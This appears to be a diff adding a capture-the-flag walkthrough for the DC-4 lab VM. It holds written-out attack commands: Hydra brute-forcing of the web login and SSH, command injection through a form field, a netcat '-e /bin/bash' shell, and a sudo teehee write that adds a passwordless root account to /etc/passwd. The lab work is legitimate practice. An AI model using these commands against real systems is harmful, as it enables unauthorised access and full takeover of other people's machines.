@@ -1,0 +1,219 @@
+So lets start the Hacking
+
+ip =  192.168.56.3
+
+
+Nmap scan report for 192.168.56.3
+Host is up (0.0023s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
+|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
+|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
+80/tcp open  http    nginx 1.15.10
+|_http-server-header: nginx/1.15.10
+|_http-title: System Tools
+MAC Address: 08:00:27:B3:AB:48 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+Let's moove to the burp-suite 
+
+
+POST /index.php HTTP/1.1
+Host: 192.168.56.3
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.56.3/index.php
+DNT: 1
+Connection: close
+Cookie: PHPSESSID=me1g223igajs3lvu5i22pgs8q3
+Upgrade-Insecure-Requests: 1
+
+there's nothin i found in dirb and nikto so i used 
+dirbuster with medium list
+
+root@saimson:~# dirbuster -u http://192.168.56.3 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Starting OWASP DirBuster 1.0-RC1
+Starting dir/file list based brute forcing
+File found: /index.php - 200
+Dir found: /images/ - 403
+Dir found: / - 200
+File found: /login.php - 302
+Dir found: /css/ - 403
+File found: /logout.php - 302
+File found: /command.php - 302          //i used hydra with string S-sucess but not worked let used command.php instead of sucess 
+
+
+ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.3 http-post-form "/login.php:username=^USER^&password=^PASS^:S=command.php" -V
+
+  // it's took arround one and half minut to grep the password  
+
+ [80][http-post-form] host: 192.168.56.3   login: admin   password: happy
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-13 09:18:09
+
+so now i have 
+ user=admin
+ password=happy
+
+ lets log in
+
+ yes we loged in 
+ and this line of code will execute your command
+
+ <input type="radio" name="radio" value="ls -l" checked="checked">
+
+ so let's enumerate it
+
+
+ root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+messagebus:x:105:109::/var/run/dbus:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false
+charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
+jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
+sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
+Debian-exim:x:108:112::/var/spool/exim4:/bin/false
+
+now we have 
+4 system users
+charles,jim,sam,root
+
+surely i will use hydra and continue the enumeration
+
+lets cmd for bind shell
+  nc -nlvp 5555 to my host
+
+ nc -nv 192.168.56.3 5555 -e /bin/bash
+
+after the shell tty convrt
+
+in jim's home dir i found a old.password.bak 
+i just copied it an make a file on local host 
+
+used hydra eith usr.txt and pass.txt
+
+root@saimson:~/Desktop/.machine/dc-4# vim pass.txt
+root@saimson:~/Desktop/.machine/dc-4# hydra -L usr.txt  -P pass.txt  192.168.56.3 ssh
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-13 11:42:16
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1012 login tries (l:4/p:253), ~64 tries per task
+[DATA] attacking ssh://192.168.56.3:22/
+[STATUS] 178.00 tries/min, 178 tries in 00:01h, 836 to do in 00:05h, 16 active
+[STATUS] 138.33 tries/min, 415 tries in 00:03h, 599 to do in 00:05h, 16 active
+[22][ssh] host: 192.168.56.3   login: jim   password: jibril04
+
+
+i found 
+jim's pass-jibril04
+
+
+
+
+
+jim@dc-4:~$ cat /var/mail/
+jim       www-data  
+jim@dc-4:~$ cat /var/mail/jim 
+backups/      .bashrc       .profile      
+.bash_logout  mbox          test.sh       
+jim@dc-4:~$ cat /var/mail/jim test.sh 
+From charles@dc-4 Sat Apr 06 21:15:46 2019
+Return-path: <charles@dc-4>
+Envelope-to: jim@dc-4
+Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
+Received: from charles by dc-4 with local (Exim 4.89)
+	(envelope-from <charles@dc-4>)
+	id 1hCjIX-0000kO-Qt
+	for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
+To: jim@dc-4
+Subject: Holidays
+MIME-Version: 1.0
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1hCjIX-0000kO-Qt@dc-4>
+From: Charles <charles@dc-4>
+Date: Sat, 06 Apr 2019 21:15:45 +1000
+Status: O
+
+Hi Jim,
+
+I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.
+
+Password is:  ^xHhA&hvim0y
+
+See ya,
+Charles
+
+new user charles 
+pass- ^xHhA&hvim0y
+
+
+this user have sudo permission on teehee 
+an editor
+so i 
+used echo "saim::0:0:::/bin/bash" |sudo teehee -a /etc/passwd
+
+su saim
+
+
+root@dc-4:/root# id
+uid=0(root) gid=0(root) groups=0(root)
+root@dc-4:/root# ls
+flag.txt
+root@dc-4:/root# cat flag.txt 
+
+
+
+888       888          888 888      8888888b.                             888 888 888 888 
+888   o   888          888 888      888  "Y88b                            888 888 888 888 
+888  d8b  888          888 888      888    888                            888 888 888 888 
+888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
+888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
+88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
+8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
+888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and who have taken time to complete these little
+challenges.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
